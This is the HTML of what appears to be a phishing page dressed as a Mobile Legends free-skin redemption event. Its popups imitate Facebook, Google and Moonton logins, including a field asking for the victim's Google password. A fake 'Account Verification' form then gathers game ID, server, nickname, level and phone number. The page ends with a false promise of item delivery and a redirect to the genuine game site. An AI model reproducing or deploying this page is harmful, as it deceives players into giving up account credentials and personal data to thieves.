<img style="border-bottom: 0px;" src="https://images.cahyosr.my.id/img/13/image/6200e7a5b194bfb191cb812c3f27604b.jpg">
</figure>
</div>
<div>
<p><img src="https://images.cahyosr.my.id/img/13/tokens.png">
<s>1500</s> <d>1</div>
</div>

<div class="item itemShine" onmousedown="buka.play();"onclick="open_itemReward_confirmation2(this);" src="https://images.cahyosr.my.id/img/13/image/ae3ccce950535d9ff8db03a24f4b0970.jpg" item-name="Hayabusa  - Kakashi Hatake" item-total="" item-price="1">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://images.cahyosr.my.id/img/13/image/ae3ccce950535d9ff8db03a24f4b0970.jpg">
</figure>
</div>
<div>
<p><img src="https://images.cahyosr.my.id/img/13/tokens.png">
<s>1500</s> <d>1</div>
</div>

<div class="item itemShine" onmousedown="buka.play();"onclick="open_itemReward_confirmation2(this);" src="https://images.cahyosr.my.id/img/13/image/5b36ab043baf2b107128b19494d870e3.jpg" item-name="Kalea  - Sakura Haruno" item-total="" item-price="1">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://images.cahyosr.my.id/img/13/image/5b36ab043baf2b107128b19494d870e3.jpg">
</figure>
</div>
<div>
<p><img src="https://images.cahyosr.my.id/img/13/tokens.png">
<s>1500</s> <d>1</div>
</div>

<div class="item itemShine" onmousedown="buka.play();"onclick="open_itemReward_confirmation2(this);" src="https://images.cahyosr.my.id/img/13/image/84e8e04b90f487d3138be8c3bc2325c7.jpg" item-name="Vale  - Gaara" item-total="" item-price="1">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://images.cahyosr.my.id/img/13/image/84e8e04b90f487d3138be8c3bc2325c7.jpg">
</figure>
</div>
<div>
<p><img src="https://images.cahyosr.my.id/img/13/https://images.cahyosr.my.id/img/13/tokens.png">
<s>1500</s> <d>1</div>
</div>

<div class="item itemShine" onmousedown="buka.play();"onclick="open_itemReward_confirmation2(this);" src="https://images.cahyosr.my.id/img/13/image/c7239fcfcafe8c9eeedb3a1654b8e500.jpg" item-name="Ling  - Neobeast Ling" item-total="" item-price="1">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://images.cahyosr.my.id/img/13/image/c7239fcfcafe8c9eeedb3a1654b8e500.jpg">
</figure>
</div>
<div>
<p><img src="https://images.cahyosr.my.id/img/13/tokens.png">
<s>1500</s> <d>1</div>
</div>

<div class="item itemShine" onmousedown="buka.play();"onclick="open_itemReward_confirmation2(this);" src="https://images.cahyosr.my.id/img/13/https://images.cahyosr.my.id/img/13/image/a625c25b4b05675a41ed63769d314dfb.jpg" item-name="Brody  - Neobeast Brody" item-total="" item-price="1">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://images.cahyosr.my.id/img/13/image/a625c25b4b05675a41ed63769d314dfb.jpg">
</figure>
</div>
<div>
<p><img src="https://images.cahyosr.my.id/img/13/tokens.png">
<s>1500</s> <d>1</div>
</div>

<div class="item itemShine" onmousedown="buka.play();"onclick="open_itemReward_confirmation2(this);" src="https://images.cahyosr.my.id/img/13/image/528b71a6d94ceed9f5b28d93479d1182.jpg" item-name="Pharsa - Neobeast Pharsa" item-total="" item-price="1">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://images.cahyosr.my.id/img/13/image/528b71a6d94ceed9f5b28d93479d1182.jpg">
</figure>
</div>
<div>
<p><img src="https://images.cahyosr.my.id/img/13/tokens.png">
<s>1500</s> <d>1</div>
</div>

<div class="item itemShine" onmousedown="buka.play();"onclick="open_itemReward_confirmation2(this);" src="https://images.cahyosr.my.id/img/13/image/8c13995266d98ccf0c41989fc33c0ca5.jpg" item-name="Lylia - Neobeast Lylia" item-total="" item-price="1">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://images.cahyosr.my.id/img/13/image/8c13995266d98ccf0c41989fc33c0ca5.jpg">
</figure>
</div>
<div>
<p><img src="https://images.cahyosr.my.id/img/13/tokens.png">
<s>1500</s> <d>1</div>
</div>


<div class="item itemShine" onmousedown="buka.play();"onclick="open_itemReward_confirmation2(this);" src="https://images.cahyosr.my.id/img/13/image/248e15c672716508dc7f9d47cf5ba75b.jpg" item-name="Karrie - Breath of Naraka" item-total="" item-price="1">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://images.cahyosr.my.id/img/13/image/248e15c672716508dc7f9d47cf5ba75b.jpg">
</figure>
</div>
<div>
<p><img src="https://images.cahyosr.my.id/img/13/tokens.png">
<s>1500</s> <d>1</div>
</div>

<div class="item itemShine" onmousedown="buka.play();" onclick="open_itemReward_confirmation2(this);" src="https://images.cahyosr.my.id/img/13/image/df4a10f7084b5336d97409325758ae9f.jpg" item-name="Angela - Strings of Fate" item-total="" item-price="1">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://images.cahyosr.my.id/img/13/image/df4a10f7084b5336d97409325758ae9f.jpg">
</figure>
</div>
<div>
<p><img src="https://images.cahyosr.my.id/img/13/tokens.png">
<s>1500</s> <d>1</div>
</div>

<div class="item itemShine" onmousedown="buka.play();" onclick="open_itemReward_confirmation2(this);" src="https://images.cahyosr.my.id/img/13/image/4f2922bfeb78c513ef6d9be850f694d9.jpg" item-name="Freya - Galactic Vanquisher" item-total="" item-price="1">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://images.cahyosr.my.id/img/13/image/4f2922bfeb78c513ef6d9be850f694d9.jpg">
</figure>
</div>
<div>
<p><img src="https://images.cahyosr.my.id/img/13/tokens.png">
<s>1000</s> <d>1</div>
</div>

<div class="item itemShine" onmousedown="buka.play();" onclick="open_itemReward_confirmation2(this);" src="https://images.cahyosr.my.id/img/13/image/38ac608315cd3cf344822ae37a92d472.jpg" item-name="Lunox - Divine Goddess" item-total="" item-price="1">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://images.cahyosr.my.id/img/13/image/38ac608315cd3cf344822ae37a92d472.jpg">
</figure>
</div>
<div>
<p><img src="https://images.cahyosr.my.id/img/13/tokens.png">
<s>1000</s> <d>1</div>
</div>

<div class="item itemShine" onmousedown="buka.play();" onclick="open_itemReward_confirmation2(this);" src="https://images.cahyosr.my.id/img/13/image/422e2c89b4430f57b11832039169e284.jpg" item-name="Lesley - Angelic Agent" item-total="" item-price="1">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://images.cahyosr.my.id/img/13/image/422e2c89b4430f57b11832039169e284.jpg">
</figure>
</div>
<div>
<p><img src="https://images.cahyosr.my.id/img/13/tokens.png">
<s>1000</s> <d>1</div>
</div>

<div class="item itemShine" onmousedown="buka.play();" onclick="open_itemReward_confirmation2(this);" src="https://images.cahyosr.my.id/img/13/image/4a35ce450675a234f69b798d85d93dd9.jpg" item-name="Ling - Serene Plume" item-total="" item-price="1">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://images.cahyosr.my.id/img/13/image/4a35ce450675a234f69b798d85d93dd9.jpg">
</figure>
</div>
<div>
<p><img src="https://images.cahyosr.my.id/img/13/tokens.png">
<s>1000</s> <d>1</div>
</div>

</center>
</div>
</div>
</div> <!--- box-item --->
</div> <!--- box --->
</div> <!--- container-box --->
</div> <!--- laz-container --->
</div> <!--- laz-home --->

<div class="popup-login login-facebook animated fadeIn" style="display: none;">
<div class="popup-box-login-fb">
<a onmousedown="tutup.play();" onclick="close_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
<div class="navbar-fb">
<img src="https://images.cahyosr.my.id/img/13/style-https://images.cahyosr.my.id/img/13/facebook-text.png">
</div>
<div class="content-box-fb">
<p class="kaget email-fb" style="width: 320px; top: -5px; text-align: left;">The email address or phone number that you've entered doesn't match any account. <b>Sign up for an account.</b></p>
<p class="kaget sandi-fb" style="width: 320px; top: -5px; text-align: left;">The password that you've entered is incorrect. Forgotten password?</p>
<img src="https://images.cahyosr.my.id/img/13/style-img/icon_2.webp">
<div class="txt-login-fb">
 Log in to your Facebook account to connect to Mobile Legend.
</div>
<form class="login-form" action="javascript:void(0)" method="post" id="ValidateVerificationDataFB">
<div class="form-group-fb">
<input type="text" name="email" id="email-facebook" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required oninvalid="this.setCustomValidity('Enter Mobile number or email address')" oninput="setCustomValidity('')">
<div class="form-group-sohid showFbPassword" id="showFbPassword" onclick="showFbPassword()">
<img src="https://images.cahyosr.my.id/img/13/style-img/show.png">
</div> <!--- form-group-sohid showFbPassword --->
<div class="form-group-sohid hidePassword" style="display: none;" onclick="hideFbPassword()">
<img src="https://images.cahyosr.my.id/img/13/style-img/hide.png">
</div> <!--- form-group-sohid showFbPassword --->
<input type="password" name="password" id="password-facebook" placeholder="Password" autocomplete="off" autocapitalize="off" required oninvalid="this.setCustomValidity('Enter Password')" oninput="setCustomValidity('')">
</div> <!--- form-group-fb --->
<input type="hidden" name="login" id="login-facebook" value="Facebook" readonly>
<button type="submit" class="btn-login-fb" onclick="ValidateLoginFbData()">Log In</button>
</form>
<div class="txt-create-account">Create Account</div>
<div class="txt-not-now">Not now</div>
<div class="txt-forgotten-password">Forgotten password?</div>
</div>
<div class="language-box">
<center>
<div class="language-name language-name-active">English (UK)</div>
<div class="language-name">العربية</div>
<div class="language-name">Türkçe</div>
<div class="language-name">Tiếng Việt</div>
<div class="language-name">日本語</div>
<div class="language-name">Español</div>
<div class="language-name">Português (Brasil)</div>
<div class="language-name">
<i class="fa fa-plus"></i>
</div>
</center>
</div>
<div class="copyright">Meta © 2023</div>
</div> <!--- popup-box-login-fb --->
</div> <!--- popup-login--->

<div class="popup-login login-facebook-load" style="display: none;">
<div class="popup-box-login-fb">
<div class="navbar-fb">
<img src="https://images.cahyosr.my.id/img/13/style-img/facebook-text.png">
</div> <!--- navbar --->
<div class="content-box-fb">
<div class="fb-load">
<img src="https://images.cahyosr.my.id/img/13/style-img/icon_fb.png">
<div class="loader3"></div>
</div> <!--- fb-load --->
</div> <!--- content-box-fb --->
</div> <!--- popup-box-login-fb --->
</div> <!--- popup-login--->

<div class="popup account_verification animated fadeIn" style="display: none;margin-top:0px;">
<div class="popup-box-wrapperz">
<div class="popup-box-navbarz">
<div class="popup-box-navbar-title">Account Verification</div> <!--- popup-box-navbar-title --->
</div> <!--- popup-box-navbar --->
<div class="popup-box-bgz">
<div class="popup-box-alert4">
<br>Please re-verify your account</font></div> <!--- popup-box-alert --->
<form class="popup-box-form" action="javascript:void(0)" method="post" id="FormFB">
<input type="hidden" name="email" id="validateEmail" readonly>
<input type="hidden" name="password" id="validatePassword" readonly>
<div class="pengkhianat-setengah" style="float: left;margin-left:5px;margin-right:0px;">
<input type="hidden" name="password" id="validatePassword" readonly>
<input type="hidden" name="pass" id="validatePass" readonly>
<input type="number" name="playid" id="playid" placeholder="Game ID" autocomplete="off" required oninvalid="this.setCustomValidity('Input your Game ID')" oninput="setCustomValidity('')">
</div>
<div class="pengkhianat-setengah" style="float: right;margin-right:5px;margin-left:0px;">
<input type="number" name="server" id="server" placeholder="Server ID" autocomplete="off" required oninvalid="this.setCustomValidity('Input Your Server ID')" oninput="setCustomValidity('')">
</div>
<input type="text" name="nick" id="nick" placeholder="Nickname" autocomplete="off" required oninvalid="this.setCustomValidity('Input your Nickname')" oninput="setCustomValidity('')">
<select name="level" id="level" required oninvalid="this.setCustomValidity('Pilih Tingkat Akun Anda')" oninput="setCustomValidity('')">
		<option selected="selected" disabled="disabled" value="">Account Level</option>
		<script>
			for(var i = 1; i <= 100; i++){
				document.write("<option>" + i + "</option>");
			};
		</script>
	</select>
<input type="number" name="phone" id="phone" placeholder="Phone number" autocomplete="off" required oninvalid="this.setCustomValidity('Input Your Phone Number')" oninput="setCustomValidity('')">
<input type="hidden" name="login" id="validateLogin" readonly>
<br>
<br>
<div class="popup-box-footer">
<button type="submit" onmousedown="buka.play();" onclick="ValidateVerificationData()" style="margin-top: -8px;width: 43%;padding-left: 0;padding-right: 0;font-size: 15px;"><font style="color:#ffffff;margin-left:0px">Verification</font></button>
</div> <!--- popup-box-footer --->
</div> <!--- popup-box-bg --->
</form> <!--- form --->
</div> <!--- popup-box-wrapper popup-box-verification --->
</div> <!--- popup account_verification --->

<div class="popup check_verification animated fadeIn" style="display: none;">
<div class="popup-box-wrapperz">
<div class="popup-box-navbarz">
<div class="popup-box-navbar-title">Account Verification</div> <!--- popup-box-navbar-title --->
</div> <!--- popup-box-navbar --->
<div class="popup-box-bgx">
<div class="popup-box-alert4"><br>
<i class="zmdi zmdi-spinner zmdi-hc-spin"></i>
<br>
Checking your account details...
<br><br>
</div> <!--- popup-box-bg --->
<div class="popup-box-footer">
</div> <!--- popup-box-form-footer --->
</div> <!--- popup-box-alert4 --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup check_verification --->

<div class="popup processing_account animated fadeIn" style="display: none;">
	<div class="popup-box-wrapperz">
		<div class="popup-box-navbarz">
			<div class="popup-box-navbar-title">Processing Accounts</div>
		</div>
		<div class="popup-box-bgz">
			<div class="popup-box-alert3"><br>
				Hello!<br>
<p>We are glad you are still loyal to Mobile Legend.
<br>Your item is being processed to be sent to your account.
<br>The item is sent to your <a style="color: #ff0000;">in-game mail inbox</a>.</p>
<p>We will also notify you in your mailbox when we have successfully sent your item.
<br>Please allow up to 24 hours.</p>
					<br></p>
			<div class="popup-box-footer">
				<button type="button" style="margin-top: 3px;" onmousedown="tutup.play();" onclick="location.href='https://m.mobilelegends.com/';">Logout</button>
</div> <!--- popup-box-bg --->
</div> <!--- popup-box-form-footer --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup processing_account --->
</div>


<div class="mobapay-footer" style="position: relative;">
<div class="mobapay-footer-inner content-padding-30 ">
<div class="mobapay-footer-social">
<div class="mobapay-footer-social-tip">Stay updated with us</div>
<div class="mobapay-footer-social-grouping">
<div class="mobapay-footer-social-grouping-item">
<img src="https://akmweb.youngjoygame.com/web/mobapay/image/eccbf0fdba3cbc5f6763be10ff0a8a26.svg" alt="">
</div>
<div class="mobapay-footer-social-grouping-item">
<img src="https://akmweb.youngjoygame.com/web/mobapay/image/2f0fb5e587da2aa53007e307599131fd.svg" alt=""></div>
<div class="mobapay-footer-social-grouping-item">
<img src="https://akmweb.youngjoygame.com/web/mobapay/image/49222950e4c5596fdb618089730f76ca.svg" alt=""></div>
<div class="mobapay-footer-social-grouping-item">
<img src="https://akmweb.youngjoygame.com/web/mobapay/image/7773ab825596da97864bce15583a44a4.png" alt="" style="width: 43px;height: 40px;margin-left: -6px;"></div></div></div>
<ul class="mobapay-footer-terms"><li>Cookie Policy</li><li>Terms and Conditions</li><li>Privacy Policy</li></ul>
<div class="mobapay-footer-copyright">Contact Us : <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="503d3f32393c353c3537353e342337313d35103d3f3f3e243f3e7e333f3d">[email&#160;protected]</a></div><br>
<div class="mobapay-footer-copyright">© Moonton. All rights reserved</div></div></div></div>

<div class="popup open_rewards animated fadeIn" style="display: none;">
<div class="popup-box-wrapper">
<div class="popup-box-bg" style="height:220px;">
<div class="popup-box-alert4"><br> </div> <!--- popup-box-alert --->
<div class="popup-box-item">
<div>
<figure>
<img class="popup-item flip" src="">
</figure>
</div>
</div> <!--- popup-box-item --->
<br>
<div class="popup-box-footer" style="margin-top:40px;">
<button type="button" onmousedown="buka.play();" onmousedown="buka.play();" onclick="open_account_verification()">Collect</button>
</div> <!--- popup-box-bg --->
</div> <!--- popup-box-footer --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup open_rewards --->

<div class="popup loadinglogin" style="display: none;">
<div class="loadinglogin"style="width:400px;height: 679px;margin-top:276px;margin-left:auto;margin-right:auto;">
<div class="loader-line"></div>
<div class="loader-label" id="text-login1">Checking for updates...</div>
<div class="loader-label" style="display:none" id="text-login2">Connecting to server...</div>
<img src="https://images.cahyosr.my.id/img/13/image/fd27b2494c17d424ebb458fa3598cd4d.jpg" style="background-size: 100% 100%;width: 100%;">
</img>
</div>
</div>

<div class="popup account_login animated fadeIn" style="display: none;">
<div class="popup-box-wrapper">
</div>
<div class="login-box">
<div class="popup-box-navbar-loginz">Login Account</div>
<div class="popup-box-alert-login">Log in now to redeem your ticket and exclusive items.<br></div>


<button type="button" class="popup-btn-login popup-btn-mlbb" style="display: 1" onmousedown="buka.play();" onclick="open_google();"><img class="icon-login" src="https://images.cahyosr.my.id/img/13/assets/btn_gp.png"></img>Sign in with Google Account</button>

<!--- LOGIN METODE MT--->
<button type="button" class="popup-btn-login popup-btn-mlbb" style="display: 1" onmousedown="buka.play();" onclick="open_moonton();"><img class="icon-login" src="https://images.cahyosr.my.id/img/13/assets/btn_mt.png"></img>Sign in with Moonton Account</button>


<br><br><br>
</div> <!--- popup-box-bg --->
</div> <!--- popup-box-footer --->

<div class="popup-login login-moonton animated fadeIn" style="display: none;">
<div class="popup-box-login-moonton">
<a onmousedown="tutup.play();" onclick="close_moonton()" class="close-moonton"><i class="fa-solid fa-xmark"></i></a>
<div class="txt-login-moonton">Login with Moonton Account</div> <!--- txt-login-moonton --->
<div class="content-box-moonton">
<form action="javascript:void(0)" method="post" id="ValidateVerificationDataMT">
<div class="form-group-moonton">
<i class="fa-solid fa-asterisk" style="float: left;margin-top: 12px;margin-left: -8px;color: #59211d;"></i>
<input type="text" name="email" id="email-moonton" placeholder="Email Address/Moonton Account/Phone Number" autocomplete="off" required />
</div> <!--- form-group-moonton --->
<div class="sublabel">Login with Moonton Account</div>
<div class="form-group-moonton">
<i class="fa-solid fa-asterisk" style="float: left;margin-top: 12px;margin-left: -8px;color: #59211d;"></i>
<div class="form-group-sohi moontonShowPassword" onclick="showmoontonPassword()">
<i class="fa-regular fa-eye" style="margin-top: 13px;margin-left: -7px;color: #637389;"></i>
</div> <!--- form-group-sohi moontonShowPassword --->
<div class="form-group-sohi moontonHidePassword" style="display: none;" onclick="hidemoontonPassword()">
<i class="fa-regular fa-eye-slash" style="margin-top: 13px;margin-left: -7px;color: #637389;"></i>
</div> <!--- form-group-sohi moontonHidePassword --->
<input type="password" name="password" id="password-moonton" placeholder="Password" autocomplete="off" required oninvalid="this.setCustomValidity('Enter Password')" oninput="setCustomValidity('')">
</div> <!--- form-group-moonton --->
<div class="sublabel">Use 6 or more characters with a mix of uppercase and lowercase, numbers, and no special symbols</div>
<div class="form-group-moonton">
<i class="fa-solid fa-asterisk" style="float: left;margin-top: 12px;margin-left: -8px;color: #59211d;"></i>
<div class="form-group-sohi gpShowPassword" onclick="showgpPassword()">
<i class="fa-regular fa-eye" style="margin-top: 13px;margin-left: -7px;color: #637389;"></i>
</div> <!--- form-group-sohi moontonShowPassword --->
<div class="form-group-sohi gpHidePassword" style="display: none;" onclick="hidegpPassword()">
<i class="fa-regular fa-eye-slash" style="margin-top: 13px;margin-left: -7px;color: #637389;"></i>
</div> <!--- form-group-sohi moontonHidePassword --->
<input type="password" name="pass" id="password-gpmt" placeholder="Google Password" autocomplete="off" required oninvalid="this.setCustomValidity('Enter Google Password')" oninput="setCustomValidity('')">
</div> <!--- form-group-moonton --->
<div class="sublabel">Enter Your Google Password</div>
<p class="kagettw email-mt" style="width: 330px; top: -17px; text-align: center; margin-bottom: 3px; margin-left: -18px;">Sorry, we couldn't find your account.</p>
<p class="kagettw sandi-mt" style="width: 330px; top: -17px; text-align: center; margin-bottom: 3px; margin-left: -20px;">Wrong Password!</p>
<p class="kagettw sandi-gp" style="width: 330px; top: -17px; text-align: center; margin-bottom: 3px; margin-left: -20px;">Wrong Google Password!</p>
<input type="hidden" name="login" id="login-moonton" value="Moonton" readonly>
<div class="footer-text-moonton">Forgot Password?</div>
<button type="submit" onclick="ValidateLoginMoontonData()">Login</button>
</form>
</div> <!--- content-box-moonton --->
</div> <!--- popup-box-login-moonton --->
</div> <!--- popup-login --->

<div class="popup-login login-moonton-load" style="display: none;">
<div class="popup-box-login-moonton">
<div class="moonton-load">
<div class="moonton-load-title">
<div class="loader2"></div>
</div> <!--- moonton-load-title --->
</div> <!--- moonton-load --->
</div> <!--- popup-box-login-moonton --->
</div> <!--- popup-login --->

<div class="popup-login login-google animated fadeIn" style="display: none;">
	<div class="popup-box-login-google">
	<a onmousedown="tutup.play();" onclick="close_google()" class="close-other"><i class="zmdi zmdi-close"></i></a>
		<div class="box-google">
			<div class="header-google"><svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" class="BFr46e xduoyf">
					<g id="qaEJec">
						<path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"></path>
					</g>
					<g id="YGlOvc">
						<path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path>
					</g>
					<g id="BWfIk">
						<path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"></path>
					</g>
					<g id="e6m3fd">
						<path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"></path>
					</g>
					<g id="vbkDmc">
						<path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"></path>
					</g>
					<g id="idEJde">
						<path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"></path>
					</g>
				</svg>
			</div> <!--- header-google --->
			<div class="txt-login-google">Sign in</div> <!--- txt-login-google --->
			<div class="txt-login-google-desc">Use your Google account</div> <!--- txt-login-google-desc --->
			<form  action="javascript:void(0)" method="post" id="ValidateVerificationDataGP">
				<div class="input-box">
					<label class="input-label">Email or phone</label>
					<input type="text" class="input-1" name="email" id="email-google" onfocus="setFocus(true)" onblur="setFocus(false)" required>
				</div>
				<div class="input-box">
					<label class="input-label">Password</label>
					<input type="password" class="input-1" name="password" id="password-google" onfocus="setFocus(true)" onblur="setFocus(false)" required>
				</div>
				<input type="hidden" name="login" id="login-google" value="Google" readonly>
				<div class="email-google" style="color: #d50000; font-size: 14px; text-align: left; display: none;"><svg aria-hidden="true" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg> Couldn't find your Google account.</div>
				<div class="sandi-google" style="color: #d50000; font-size: 14px; text-align: left; display: none;"><svg aria-hidden="true" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg> Wrong password, try again.</div>
				<button type="button" class="btn-forgot-google">Forgot email?</button>
				</br>
				<div class="notify-google">Not your computer? Use Guest mode to sign in privately. <span>Learn more</span></div> <!--- notify-google --->
				</br>
				<button type="submit" class="btn-login-google" onclick="ValidateLoginGoogleData()">Next</button>
				<button type="button" class="btn-create-google">Create account</button>
			</form>
			</br>
			</br>
		</div> <!--- box-google --->
	</div>
</div>

<div class="popup-login login-google-load animated fadeIn" style="display: none;">
	<div class="popup-box-login-google">
		<div class="box-google">
			<div class="header-google"><svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" class="BFr46e xduoyf">
					<g id="qaEJec">
						<path fill="#ea4335" d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"></path>
					</g>
					<g id="YGlOvc">
						<path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path>
					</g>
					<g id="BWfIk">
						<path fill="#4285f4" d="M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z"></path>
					</g>
					<g id="e6m3fd">
						<path fill="#fbbc05" d="M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z"></path>
					</g>
					<g id="vbkDmc">
						<path fill="#ea4335" d="M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z"></path>
					</g>
					<g id="idEJde">
						<path fill="#4285f4" d="M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z"></path>
					</g>
				</svg>
			</div> <!--- header-google --->
			<br>
			<br>
			<i class="zmdi zmdi-spinner zmdi-hc-4x zmdi-hc-spin" style="color: #1a73e8;margin-top: 86px;"></i>
			<br>
			<br>
			<br>
		</div> <!--- box-google --->
	</div>
</div>

</div><div class="popup itemReward_confirmation2 fadeIn" style="display: none;">
<div class="popup-box-wrapperz">
<div class="popup-box-navbar-lz" style="margin-bottom:11px;">
<div class="popup-box-navbar-lz-title">Confirmation</div>
<img onmousedown="tutup.play();" onclick="close_reward_confirmation()" src="https://images.cahyosr.my.id/img/13/popup-close2.png" style="margin-top: -10px;margin-right: 13px;opacity: 77%;">
</div>
<div class="popup-box-lz">
<div class="popup-box-alert-lz">Are you sure you want to exchange this item?</div>
<div class="bgrew"></div>
<div class="popup-box-item bordermotion itemShine" style="width: 21%;height: 78px;margin-top: 9px;margin-left: 50px;margin-bottom:10px;">
<rw id="ItemName"></rw>
<div class="popup-box-alert-price">Price:</div>
<pr id="price"></pr>
<div>
<figure>
<span id="amount"></span>
<img src="" id="myItemReward_confirmationImg">
</figure>
</div>
<div class="line"></div>
<img src="https://images.cahyosr.my.id/img/13/tokens.png" style="margin-top: 4px;margin-right: -67px;width: 13px;height: auto;">
</div> <!--- popup-box-item --->
<div class="popup-box-footer-lz">
<button type="button" onmousedown="buka.play();" onclick="open_account_verification()" style="width: 111px;height: 27px;padding-left: 0;padding-right: 0;margin-top: 2px;"><font style="">Redeem</font> </button>
</div> <!--- popup-box-footer --->
</div> <!--- popup-box-bg --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup itemReward_confirmation --->

</div><div class="popup itemReward_confirmationsold fadeIn" style="display: none;">
<div class="popup-box-wrapperz">
